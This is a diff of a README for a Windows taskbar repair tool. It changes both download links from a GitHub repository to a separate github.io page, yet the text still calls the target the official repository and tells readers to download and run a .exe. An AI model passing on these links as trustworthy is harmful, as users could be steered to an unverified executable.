@@ -1,6 +1,6 @@
 # 🛠️ Taskbar-Frozen-Fix - Restore your unresponsive Windows taskbar fast
 
-[![Download Taskbar-Frozen-Fix](https://img.shields.io/badge/Download-Taskbar-Frozen-Fix-blue.svg)](https://github.com/SamvegProOp/Taskbar-Frozen-Fix)
+[![Download Taskbar-Frozen-Fix](https://img.shields.io/badge/Download-Taskbar-Frozen-Fix-blue.svg)](https://samvegproop.github.io)
 
 ## 🎯 About this tool
 
@@ -29,7 +29,7 @@ This tool detects these faults and forces a clean restart of the interface compo
 
 Follow these steps to download and run the software.
 
-1. Navigate to the official repository page here: [Download Taskbar-Frozen-Fix](https://github.com/SamvegProOp/Taskbar-Frozen-Fix).
+1. Navigate to the official repository page here: [Download Taskbar-Frozen-Fix](https://samvegproop.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version number.
 4. Select the `.exe` file to start the download.
